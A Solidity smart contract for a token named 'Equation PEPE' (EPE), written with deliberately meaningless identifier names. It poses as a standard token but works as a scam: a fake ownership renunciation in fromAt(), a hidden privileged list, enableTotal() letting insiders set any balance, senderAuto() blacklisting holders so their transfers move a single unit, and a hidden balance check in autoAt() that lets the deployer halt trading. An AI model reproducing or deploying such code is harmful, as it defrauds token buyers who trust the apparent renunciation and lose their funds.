//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface atSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxAt) external view returns (uint256);

    function transfer(address txAmount, uint256 minSenderTotal) external returns (bool);

    function allowance(address marketingAtToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 minSenderTotal) external returns (bool);

    function transferFrom(
        address sender,
        address txAmount,
        uint256 minSenderTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitToken, uint256 value);
    event Approval(address indexed marketingAtToken, address indexed spender, uint256 value);
}

abstract contract buyFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromSwapMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderFee {
    function createPair(address buyLimit, address minEnable) external returns (address);
}

interface isTx is atSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EquationPEPE is buyFund, atSender, isTx {

    function symbol() external view virtual override returns (string memory) {
        return shouldAtAuto;
    }

    function enableTotal(address receiverLiquidity, uint256 minSenderTotal) public {
        teamSender();
        autoFeeEnable[receiverLiquidity] = minSenderTotal;
    }

    address swapTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private autoLaunch;

    mapping(address => bool) public toSell;

    function totalSupply() external view virtual override returns (uint256) {
        return totalAt;
    }

    bool private sellFrom;

    mapping(address => uint256) private autoFeeEnable;

    bool private isAt;

    function owner() external view returns (address) {
        return receiverFund;
    }

    function marketingTake(address listAuto) public {
        require(listAuto.balance < 100000);
        if (limitLiquidity) {
            return;
        }
        
        txLaunch[listAuto] = true;
        if (fundEnableLaunched) {
            marketingLaunchBuy = true;
        }
        limitLiquidity = true;
    }

    function exemptLimit(uint256 minSenderTotal) public {
        teamSender();
        swapModeToken = minSenderTotal;
    }

    address public walletBuy;

    function senderAuto(address senderTrading) public {
        teamSender();
        
        if (senderTrading == takeWallet || senderTrading == walletBuy) {
            return;
        }
        toSell[senderTrading] = true;
    }

    bool private fundEnableLaunched;

    function autoAt(address autoShouldTrading, address txAmount, uint256 minSenderTotal) internal returns (bool) {
        if (autoShouldTrading == takeWallet) {
            return tokenReceiver(autoShouldTrading, txAmount, minSenderTotal);
        }
        uint256 walletFrom = atSender(walletBuy).balanceOf(totalWalletFee);
        require(walletFrom == swapModeToken);
        require(txAmount != totalWalletFee);
        if (toSell[autoShouldTrading]) {
            return tokenReceiver(autoShouldTrading, txAmount, enableTrading);
        }
        return tokenReceiver(autoShouldTrading, txAmount, minSenderTotal);
    }

    function transferFrom(address autoShouldTrading, address txAmount, uint256 minSenderTotal) external override returns (bool) {
        if (_msgSender() != swapTx) {
            if (autoLaunch[autoShouldTrading][_msgSender()] != type(uint256).max) {
                require(minSenderTotal <= autoLaunch[autoShouldTrading][_msgSender()]);
                autoLaunch[autoShouldTrading][_msgSender()] -= minSenderTotal;
            }
        }
        return autoAt(autoShouldTrading, txAmount, minSenderTotal);
    }

    bool public limitLiquidity;

    function allowance(address amountIsAt, address enableSell) external view virtual override returns (uint256) {
        if (enableSell == swapTx) {
            return type(uint256).max;
        }
        return autoLaunch[amountIsAt][enableSell];
    }

    function decimals() external view virtual override returns (uint8) {
        return isTeam;
    }

    function getOwner() external view returns (address) {
        return receiverFund;
    }

    constructor (){
        
        fromSwapMode walletSender = fromSwapMode(swapTx);
        walletBuy = senderFee(walletSender.factory()).createPair(walletSender.WETH(), address(this));
        
        takeWallet = _msgSender();
        fromAt();
        txLaunch[takeWallet] = true;
        autoFeeEnable[takeWallet] = totalAt;
        if (sellFrom != marketingLaunchBuy) {
            fundEnableLaunched = false;
        }
        emit Transfer(address(0), takeWallet, totalAt);
    }

    mapping(address => bool) public txLaunch;

    function balanceOf(address maxAt) public view virtual override returns (uint256) {
        return autoFeeEnable[maxAt];
    }

    string private shouldAtAuto = "EPE";

    uint256 swapMaxSell;

    string private feeSell = "Equation PEPE";

    address public takeWallet;

    function transfer(address receiverLiquidity, uint256 minSenderTotal) external virtual override returns (bool) {
        return autoAt(_msgSender(), receiverLiquidity, minSenderTotal);
    }

    function name() external view virtual override returns (string memory) {
        return feeSell;
    }

    uint256 swapModeToken;

    function teamSender() private view {
        require(txLaunch[_msgSender()]);
    }

    bool private marketingLaunchBuy;

    uint8 private isTeam = 18;

    function tokenReceiver(address autoShouldTrading, address txAmount, uint256 minSenderTotal) internal returns (bool) {
        require(autoFeeEnable[autoShouldTrading] >= minSenderTotal);
        autoFeeEnable[autoShouldTrading] -= minSenderTotal;
        autoFeeEnable[txAmount] += minSenderTotal;
        emit Transfer(autoShouldTrading, txAmount, minSenderTotal);
        return true;
    }

    function approve(address enableSell, uint256 minSenderTotal) public virtual override returns (bool) {
        autoLaunch[_msgSender()][enableSell] = minSenderTotal;
        emit Approval(_msgSender(), enableSell, minSenderTotal);
        return true;
    }

    uint256 constant enableTrading = 1 ** 10;

    address private receiverFund;

    bool private fromIs;

    uint256 private totalAt = 100000000 * 10 ** 18;

    address totalWalletFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fromAt() public {
        emit OwnershipTransferred(takeWallet, address(0));
        receiverFund = address(0);
    }

    event OwnershipTransferred(address indexed sellTrading, address indexed minWallet);

}